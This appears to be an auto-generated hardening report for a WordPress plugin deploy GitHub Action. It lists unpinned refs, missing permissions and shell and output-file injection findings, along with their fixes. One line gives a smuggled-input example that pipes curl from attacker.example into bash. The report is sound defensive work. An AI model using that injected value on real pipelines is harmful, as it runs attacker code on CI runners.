<!-- markdownlint-disable -->

# Hardening Report: 10up--action-wordpress-plugin-deploy/2.3.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **10up--action-wordpress-plugin-deploy/2.3.0** was hardened automatically. 4 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

Multiple workflow files use mutable branch or tag refs instead of pinned 40-character commit SHAs, making the action vulnerable to supply-chain attacks.

- `.github/workflows/test.yml`: `uses: actions/checkout@master` (branch ref) and `uses: ludeeus/action-shellcheck@master` (branch ref)
- `.github/workflows/release-pull-request.yml`: `uses: actions/checkout@v3` (tag ref)
- `.github/workflows/close-stale-issues.yml`: `uses: actions/stale@v9` (tag ref)

Locations:

- `.github/workflows/test.yml:16`
- `.github/workflows/test.yml:18`
- `.github/workflows/release-pull-request.yml:11`
- `.github/workflows/close-stale-issues.yml:18`

### missing-permissions (severity: medium)

Two workflow files have no top-level `permissions:` key and no job-level `permissions:` key on any job, meaning the GITHUB_TOKEN is granted its default (broad) permissions.

- `.github/workflows/test.yml`: no permissions block at all.
- `.github/workflows/release-pull-request.yml`: no permissions block at all (the workflow uses `gh pr create` which requires write access, but no explicit minimal scope is declared).

Locations:

- `.github/workflows/test.yml:1`
- `.github/workflows/release-pull-request.yml:1`

### script-injection (severity: high)

Rule (a) violation: A `${{ }}` expression is interpolated directly inside a `run:` shell command string in `.github/workflows/release-pull-request.yml`. The step `Create Pull Request` uses `${{ steps.title.outputs.result }}` directly in the shell command:

```
run: gh pr create --title "${{ steps.title.outputs.result }}" --body-file ./.github/release-pull-request-template.md
```

The value of `steps.title.outputs.result` flows from `GITHUB_REF` (the branch name), which can be attacker-controlled. Before YAML template substitution, this value is injected verbatim into the shell command string, allowing shell metacharacter injection.

Locations:

- `.github/workflows/release-pull-request.yml:19`

### github-env-injection (severity: high)

Two locations write workflow-controlled (untrusted) values to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`).

1. `.github/workflows/release-pull-request.yml` (Generate title step): `VERSION` is derived from `GITHUB_REF` (an inherited env var set by the runner from the branch name, which is attacker-influenced). It is written directly to `$GITHUB_OUTPUT` without sanitization:
   ```
   echo "result=Release: ${VERSION}" >> "${GITHUB_OUTPUT}"
   ```

2. `deploy.sh` (generate_zip function): `SLUG` is an inherited process env var (set by the calling workflow or defaulting to `GITHUB_REPOSITORY`), which is workflow-controlled. It is written to `$GITHUB_OUTPUT` without sanitization:
   ```
   echo "zip-path=${GITHUB_WORKSPACE}/${SLUG}.zip" >> "${GITHUB_OUTPUT}"
   ```

A newline embedded in either value could inject arbitrary entries into the output file, potentially overwriting subsequent output variables.

Locations:

- `.github/workflows/release-pull-request.yml:15`
- `deploy.sh:83`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, missing-permissions, script-injection, github-env-injection

**Notes:**

Fixed all four findings:
1. unpinned-uses: Pinned all four action refs to full 40-char SHAs (actions/checkout@master, ludeeus/action-shellcheck@master, actions/checkout@v3, actions/stale@v9) with tag comments for readability.
2. missing-permissions: Added top-level permissions blocks to test.yml (contents: read) and release-pull-request.yml (contents: read, pull-requests: write).
3. script-injection: Moved ${{ steps.title.outputs.result }} from the run: shell string into the step's env: block as PR_TITLE, referenced as $PR_TITLE in the shell command.
4. github-env-injection: In release-pull-request.yml, sanitized VERSION before writing to GITHUB_OUTPUT using printf '%s' ... | tr -d '\n\r'. In deploy.sh, sanitized the zip path using the same technique before writing to GITHUB_OUTPUT.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Replaced `${{ github.action_path }}/deploy.sh` with `"$GITHUB_ACTION_PATH/deploy.sh"` in the `run:` block of action.yml. GitHub Actions pre-sets the `GITHUB_ACTION_PATH` environment variable to the same value as `github.action_path`, so this is a safe, equivalent substitution that avoids YAML template injection.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed three instances of script injection in deploy.sh where $INPUT_DRY_RUN and $INPUT_GENERATE_ZIP were expanded unquoted as shell commands (e.g., `if $INPUT_DRY_RUN`). Replaced all three with safe string comparisons using `if [[ "$INPUT_DRY_RUN" == 'true' ]]` and `if [[ "$INPUT_GENERATE_ZIP" == 'true' ]]`. This prevents a caller-supplied value like `true; curl -s https://attacker.example/x | bash` from executing arbitrary code on the runner.

